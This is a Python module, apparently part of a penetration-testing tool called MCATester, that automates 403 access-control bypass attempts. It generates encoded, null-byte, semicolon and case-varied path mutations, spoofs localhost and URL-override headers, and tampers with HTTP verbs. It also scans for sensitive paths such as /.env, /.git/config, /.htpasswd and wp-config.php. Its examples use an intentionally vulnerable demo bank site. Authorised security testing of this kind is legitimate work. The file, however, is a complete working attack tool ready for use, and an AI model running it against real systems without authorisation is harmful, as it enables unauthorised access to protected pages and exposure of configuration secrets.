#!/usr/bin/env python3
"""
MCATester - bypass_403.py  (v2)
Standalone 403 Bypass module for osint_agent.py

Techniques:
  1.  Path case variation          — /ADMIN/, /Admin/
  2.  Path suffix tricks           — /path/, /path..;/, /path;/
  3.  URL encoding                 — /%2e/path, /path%20
  4.  Double URL encoding          — /%252e/path
  5.  Null byte                    — /path%00.html
  6.  Trailing dot                 — /path.
  7.  Semicolon bypass             — /path;/
  8.  Overlong UTF-8               — /path%c0%af
  9.  Header injection             — X-Original-URL, X-Rewrite-URL, X-Forwarded-For
  10. HTTP verb tampering          — HEAD, OPTIONS, POST, PUT, TRACE
  11. Content-Type bypass          — POST with json/xml
  12. IP spoofing headers          — X-Real-IP: 127.0.0.1

Usage standalone:
    python bypass_403.py --url http://demo.testfire.net/bank/
    python bypass_403.py --url http://demo.testfire.net/bank/ --verbose
    python bypass_403.py --mutations /admin/
    python bypass_403.py --scan http://demo.testfire.net   (find 403s then bypass)

Integration: imported automatically by osint_agent.py if in same folder.
"""

import re
import sys
import time
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, quote
from osint_patches_v6 import verify_bypass_response
urllib3.disable_warnings()

HEADERS_BASE = {
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/124.0.0.0 Safari/537.36",
    "Accept":          "text/html,application/xhtml+xml,application/json,*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection":      "keep-alive",
}


# ─────────────────────────────────────────────
# HTTP HELPER
# ─────────────────────────────────────────────

def _req(method, url, headers=None, data=None, timeout=6):
    try:
        h = {**HEADERS_BASE, **(headers or {})}
        # allow_redirects=False so we capture raw server response
        # A 302 redirect itself can be a bypass indicator
        r = requests.request(
            method, url, headers=h, data=data,
            timeout=timeout, verify=False,
            allow_redirects=False,
        )
        return r.status_code, r.text[:3000], dict(r.headers)
    except Exception:
        return 0, "", {}


def _get(url, headers=None, timeout=6):
    return _req("GET", url, headers=headers, timeout=timeout)


def _check_baseline(url):
    """
    Returns the RAW server status before any redirect.
    We intentionally do NOT follow redirects because:
    - A 403 that redirects to a login page should still be treated as 403
    - allow_redirects=True can turn a 403 into a 200 by following to another page
    """
    try:
        h = {**HEADERS_BASE}
        r = requests.get(url, headers=h, timeout=6, verify=False,
                         allow_redirects=False)  # KEY: no redirect follow
        return r.status_code, r.text[:3000]
    except Exception:
        return 0, ""


# ─────────────────────────────────────────────
# PATH MUTATION GENERATOR  (Bug 2+3 fixed)
# ─────────────────────────────────────────────

def generate_path_mutations(path):
    """
    Generate all path-based bypass variants.
    Returns list of (mutated_path, technique_name).
    Preserves trailing slash, avoids producing identical strings.
    """
    # Normalise: ensure starts with /
    p = "/" + path.lstrip("/")
    # Preserve trailing slash separately
    has_trailing = p.endswith("/") and len(p) > 1
    p_base = p.rstrip("/")          # /admin
    p_seg  = p_base.lstrip("/")     # admin

    mutations = []

    # ── Case variations ──────────────────────
    upper = "/" + p_seg.upper() + ("/" if has_trailing else "")
    if upper != p:
        mutations.append((upper, "uppercase path"))

    # Smart mixed case — flip case of each character alternately
    mixed_seg = "".join(c.upper() if i % 2 == 0 else c.lower()
                        for i, c in enumerate(p_seg))
    mixed = "/" + mixed_seg + ("/" if has_trailing else "")
    if mixed != p and mixed != upper:
        mutations.append((mixed, "mixed case"))

    # ── Trailing character tricks ─────────────
    mutations.append((p_base + "//",          "double trailing slash"))
    mutations.append((p_base + "/.",           "trailing dot-slash"))
    mutations.append((p_base + ".",            "trailing dot"))
    mutations.append((p_base + "/..;/",        "dot-dot semicolon"))

    # ── Semicolon bypass ─────────────────────
    mutations.append((p_base + ";/",           "semicolon bypass"))
    mutations.append((p_base + ";.json",       "semicolon + .json"))
    mutations.append((p_base + ";index.jsp",   "semicolon + index.jsp"))

    # ── Extension tricks ─────────────────────
    for ext, name in [(".json","json ext"), (".html","html ext"),
                      (".php","php ext"), (".jsp","jsp ext"), (".do","do ext")]:
        mutations.append((p_base + ext, name))

    # ── Dummy params ─────────────────────────
    mutations.append((p + "?x=1",             "dummy query param"))
    mutations.append((p + "?debug=true",       "debug param"))
    mutations.append((p + "?v=1.0",            "version param"))

    # ── URL encoding ─────────────────────────
    # Encode the last segment
    parts = p_base.split("/")
    parent   = "/".join(parts[:-1]) or ""
    last_seg = parts[-1]

    if last_seg:
        enc  = quote(last_seg, safe="")
        denc = last_seg.replace("a","a").encode("utf-8")  # placeholder
        mutations.append((f"{parent}/{quote(last_seg, safe='')}", "url encoded segment"))
        mutations.append((f"{parent}/{quote(last_seg, safe='').replace('%','%25')}", "double url encoded"))

    # ── Path traversal prefix tricks ─────────
    mutations.append(("/%2e/" + p.lstrip("/"),         "dot-slash prefix %2e/"))
    mutations.append(("/%2e%2e/" + p.lstrip("/"),      "dot-dot prefix %2e%2e/"))
    mutations.append((p_base + "/%2e%2e" + p_base,    "self traversal"))

    # ── Null byte (legacy WAF bypass) ────────
    mutations.append((p_base + "%00.html",    "null byte + .html"))
    mutations.append((p_base + "%00.jpg",     "null byte + .jpg"))

    # ── Overlong UTF-8 ───────────────────────
    mutations.append((p.replace("/", "/%c0%af", 1), "overlong utf8 slash"))
    mutations.append((p.replace("/", "/%ef%bc%8f", 1), "full-width slash"))

    # ── Double slash ─────────────────────────
    mutations.append(("//" + p.lstrip("/"),   "leading double slash"))
    mutations.append((p.replace("/", "//", 1), "double first slash"))

    # ── Whitespace tricks ────────────────────
    mutations.append((p_base + "%20",         "trailing space %20"))
    mutations.append((p_base + "%09",         "trailing tab %09"))
    mutations.append(("/" + "%20" + p_seg,    "leading space in path"))

    # ── Deduplicate preserving order ─────────
    seen   = {p}  # exclude original
    unique = []
    for m, t in mutations:
        if m and m not in seen:
            seen.add(m)
            unique.append((m, t))
    return unique


# ─────────────────────────────────────────────
# HEADER-BASED BYPASS
# ─────────────────────────────────────────────

def generate_header_bypasses(base_url, path, full_url):
    """Returns list of (url, extra_headers, technique_name)."""
    attempts = []

    # Override-URL headers — some reverse proxies honour these
    for hdr in ["X-Original-URL", "X-Rewrite-URL", "X-Forwarded-URL",
                "X-Override-URL", "X-Proxy-URL"]:
        attempts.append((base_url, {hdr: path}, f"header {hdr}"))

    # Localhost IP spoofing — bypasses IP-based ACLs
    for hdr in ["X-Forwarded-For", "X-Real-IP", "X-Remote-IP",
                "X-Client-IP", "X-Originating-IP", "Forwarded",
                "X-Host", "X-Custom-IP-Authorization"]:
        val = "127.0.0.1" if hdr != "Forwarded" else "for=127.0.0.1"
        attempts.append((full_url, {hdr: val}, f"header {hdr}: 127.0.0.1"))

    # Referer tricks
    attempts.append((full_url, {"Referer": full_url},   "referer: self"))
    attempts.append((full_url, {"Referer": base_url},   "referer: base"))
    attempts.append((full_url, {"Referer": "https://google.com"}, "referer: google"))

    # Content-Type header tricks
    for ct in ["application/json", "application/xml", "text/xml", "multipart/form-data"]:
        attempts.append((full_url, {"Content-Type": ct}, f"content-type: {ct}"))

    # Accept header variations
    attempts.append((full_url, {"Accept": "*/*"},        "accept: wildcard"))
    attempts.append((full_url, {"Accept": "application/json"}, "accept: json"))

    return attempts


# ─────────────────────────────────────────────
# HTTP VERB BYPASS
# ─────────────────────────────────────────────

def try_verb_bypass(full_url):
    """Try HTTP verbs other than GET — some servers restrict GET but allow others."""
    results = []
    for verb in ["HEAD", "OPTIONS", "POST", "PUT", "TRACE", "PATCH", "DELETE"]:
        status, content, hdrs = _req(verb, full_url,
                                     data="{}" if verb in ("POST","PUT","PATCH") else None)
        if status not in (0, 400, 403, 405, 501, 502, 503):
            results.append({
                "technique": f"HTTP {verb}",
                "status":    status,
                "content":   content[:200],
            })
    return results


# ─────────────────────────────────────────────
# CORE BYPASS RUNNER
# ─────────────────────────────────────────────

def try_403_bypass(url, verbose=False):
    """
    Try all 403 bypass techniques on a single URL.
    Returns a full result dict.
    """
    parsed   = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    path     = parsed.path or "/"

    # ── Baseline check ──────────────────────
    baseline_status, baseline_content = _check_baseline(url)

    result_template = {
        "url":                   url,
        "baseline_status":       baseline_status,
        "bypassed":              False,
        "successful_technique":  None,
        "successful_techniques": [],
        "bypass_status":         0,
        "content_preview":       "",
        "total_attempts":        0,
        "all_attempts":          [],
    }

    # Bug 1 fix: report actual baseline even when not 403
    if baseline_status != 403:
        result_template["note"] = (
            f"Baseline is {baseline_status}, not 403 — bypass not applicable. "
            f"This URL is accessible (200) or not found (404). "
            f"Use --scan to auto-find 403 paths on your target."
        )
        return result_template

    attempts         = []
    bypassed         = False
    bypass_status    = 0
    bypass_content   = ""
    good_techniques  = []

    def _record(technique, attempt_url, status, content, headers_used=None):
        nonlocal bypassed, bypass_status, bypass_content
        entry = {
            "technique":    technique,
            "url":          attempt_url,
            "status":       status,
            "bypassed":     False,
            "headers_used": headers_used or {},
        }

        # PATCH 4: Use verified bypass check instead of simple status code
        if status in (200, 206, 301, 302, 303, 307, 308):
            bypass_resp = {
                "status": status,
                "content": content,
                "headers": headers_used or {},
            }
            baseline_resp = {
                "status": baseline_status,
                "content": baseline_content,
                "headers": {},
            }
            verify = verify_bypass_response(bypass_resp, baseline_resp)

            if verify["is_genuine_bypass"]:
                entry["bypassed"]        = True
                entry["content_preview"] = content[:300]
                entry["confidence"]      = verify["confidence"]
                entry["verify_reason"]   = verify["reason"]
                good_techniques.append(technique)
                if not bypassed:
                    bypassed       = True
                    bypass_status  = status
                    bypass_content = content
                if verbose:
                    print(f"    [\033[92mBYPASS\033[0m] {technique:45} → HTTP {status} ({verify['confidence']}: {verify['reason'][:40]})")
            else:
                if verbose:
                    print(f"    [\033[90m  FP  \033[0m] {technique:45} → HTTP {status} ({verify['reason'][:40]})")
        elif verbose:
            print(f"    [     ] {technique:45} → HTTP {status}")

        attempts.append(entry)
    # ── 1. Path mutations ────────────────────
    mutations = generate_path_mutations(path)
    for mutated_path, technique in mutations:
        mutated_url = base_url + mutated_path
        status, content, _ = _get(mutated_url)
        _record(technique, mutated_url, status, content)
        time.sleep(0.05)

    # ── 2. Header bypasses ───────────────────
    full_url = url
    for attempt_url, hdrs, technique in generate_header_bypasses(base_url, path, full_url):
        status, content, _ = _get(attempt_url, headers=hdrs)
        _record(technique, attempt_url, status, content, headers_used=hdrs)
        time.sleep(0.05)

    # ── 3. Verb bypass ───────────────────────
    for vr in try_verb_bypass(full_url):
        _record(vr["technique"], full_url, vr["status"], vr["content"])

    result_template.update({
        "bypassed":              bypassed,
        "successful_technique":  good_techniques[0] if good_techniques else None,
        "successful_techniques": good_techniques,
        "bypass_status":         bypass_status,
        "content_preview":       bypass_content[:300],
        "total_attempts":        len(attempts),
        "all_attempts":          attempts,
    })
    return result_template


# ─────────────────────────────────────────────
# STAGE RUNNER — integrates with osint_agent.py
# ─────────────────────────────────────────────

def banner_403():
    print(f"\n{'─'*55}\n  9  403 Bypass Testing\n{'─'*55}")


def run_403_bypass_stage(findings, verbose=False):
    """
    Called from osint_agent.py after all other stages.
    Collects 403 findings, runs bypass, returns new confirmed findings.
    """
    banner_403()

    targets_403 = []
    seen_urls   = set()

    for f in findings:
        if f.get("status") == 403 and f.get("source") == "on_target":
            url = f.get("url", "")
            if url and url not in seen_urls:
                seen_urls.add(url)
                targets_403.append({
                    "url":      url,
                    "severity": f.get("severity", "MEDIUM"),
                    "category": f.get("category", ""),
                    "path":     f.get("path", urlparse(url).path),
                })

    if not targets_403:
        print("  No 403 responses in findings — skipping bypass stage")
        return []

    print(f"  Found {len(targets_403)} URL(s) returning 403 — testing bypass")
    print(f"  Techniques: {len(generate_path_mutations('/test/'))} path mutations + "
          f"header injection + verb tampering\n")

    bypass_findings = []
    sev_bump = {"INFO": "LOW", "LOW": "MEDIUM", "MEDIUM": "HIGH",
                "HIGH": "CRITICAL", "CRITICAL": "CRITICAL"}

    for target in targets_403:
        url = target["url"]
        print(f"  Testing: {url[:70]}")
        result = try_403_bypass(url, verbose=verbose)

        if result["bypassed"]:
            new_sev       = sev_bump.get(target["severity"], "HIGH")
            techniques_str = ", ".join(result["successful_techniques"][:3])
            print(f"  [{new_sev}] BYPASSED — {techniques_str}")
            print(f"    HTTP {result['bypass_status']} | "
                  f"{len(result['successful_techniques'])} technique(s) worked | "
                  f"{result['total_attempts']} total attempts")

            bypass_findings.append({
                "url":       url,
                "category":  "403 Bypass",
                "severity":  new_sev,
                "status":    result["bypass_status"],
                "evidence":  {
                    "bypass_technique": result["successful_techniques"][:5],
                    "bypass_status":    [str(result["bypass_status"])],
                },
                "confirmed": True,
                "vuln_type": f"403 Access Control Bypass ({techniques_str})",
                "summary":   (f"{urlparse(url).path} bypassed via: {techniques_str}. "
                              f"HTTP {result['bypass_status']} returned."),
                "excerpt":   result["content_preview"][:300],
                "source":    "on_target",
                "bypass_detail": result,
            })
        else:
            print(f"  [✓] Protected — {result['total_attempts']} techniques tried, none worked")

        time.sleep(0.3)

    print(f"\n  403 bypass findings: {len(bypass_findings)}")
    return bypass_findings


# ─────────────────────────────────────────────
# QUICK SCAN — find 403s on a domain then bypass
# ─────────────────────────────────────────────

SCAN_PATHS = [
    "/bank/", "/bank/login.jsp", "/bank/main.jsp", "/bank/transfer.aspx",
    "/bank/customize.jsp", "/bank/queryxpath.jsp",
    "/WEB-INF/", "/WEB-INF/web.xml", "/META-INF/",
    "/manager/", "/manager/html", "/host-manager/",
    "/admin/", "/administrator/", "/console/",
    "/jmx-console/", "/web-console/", "/server-status",
    "/.env", "/.git/config", "/.htaccess", "/.htpasswd",
    "/config.php", "/wp-config.php", "/phpinfo.php",
    "/backup/", "/private/", "/secret/",
]


def quick_scan_403(base_url, paths=None):
    """Scan a base URL for 403 paths, then run bypass on each found."""
    paths = paths or SCAN_PATHS
    print(f"\n  Scanning {base_url} for 403 responses...")
    print(f"  Checking {len(paths)} paths\n")

    found_403 = []
    for path in paths:
        status, _, _ = _get(base_url.rstrip("/") + path)
        marker = "403" if status == 403 else f"{status} "
        if status == 403:
            print(f"  [403] {path}")
            found_403.append({
                "url":      base_url.rstrip("/") + path,
                "status":   403,
                "source":   "on_target",
                "severity": "MEDIUM",
                "category": "Active Scan",
                "path":     path,
            })
        time.sleep(0.1)

    print(f"\n  Found {len(found_403)} paths returning 403")
    if not found_403:
        return []

    return run_403_bypass_stage(found_403)


# ─────────────────────────────────────────────
# STANDALONE CLI
# ─────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="MCATester 403 Bypass Module",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python bypass_403.py --url http://demo.testfire.net/bank/
  python bypass_403.py --url http://demo.testfire.net/bank/ --verbose
  python bypass_403.py --mutations /admin/
  python bypass_403.py --scan http://demo.testfire.net
        """)
    parser.add_argument("--url",       help="Single 403 URL to bypass")
    parser.add_argument("--scan",      help="Scan a base URL for 403s then bypass all")
    parser.add_argument("--mutations", metavar="PATH", help="Show all mutations for a path")
    parser.add_argument("--verbose",   action="store_true", help="Show each attempt")
    args = parser.parse_args()

    if args.mutations:
        mutations = generate_path_mutations(args.mutations)
        print(f"Generated {len(mutations)} mutations for '{args.mutations}':\n")
        for m, t in mutations:
            print(f"  {t:45} → {m}")

    elif args.scan:
        results = quick_scan_403(args.scan)
        if results:
            print(f"\n{'='*55}")
            print(f"BYPASS SUMMARY — {len(results)} path(s) bypassed")
            print(f"{'='*55}")
            for r in results:
                print(f"  [{r['severity']}] {r['vuln_type']}")
                print(f"    URL: {r['url']}")

    elif args.url:
        print(f"Testing 403 bypass on: {args.url}")
        print(f"{'─'*55}")
        result = try_403_bypass(args.url, verbose=args.verbose)
        print(f"\n{'─'*55}")
        print(f"RESULT:")
        print(f"  Baseline status  : {result['baseline_status']}")
        if result.get("note"):
            print(f"  Note             : {result['note']}")
        print(f"  Bypassed         : {result['bypassed']}")
        print(f"  Total attempts   : {result['total_attempts']}")
        if result["bypassed"]:
            print(f"  Techniques worked: {', '.join(result['successful_techniques'])}")
            print(f"  Bypass HTTP code : {result['bypass_status']}")
            print(f"\n  Content preview:")
            print(f"  {result['content_preview'][:300]}")
        else:
            print(f"  Result           : Path is properly protected")
    else:
        parser.print_help()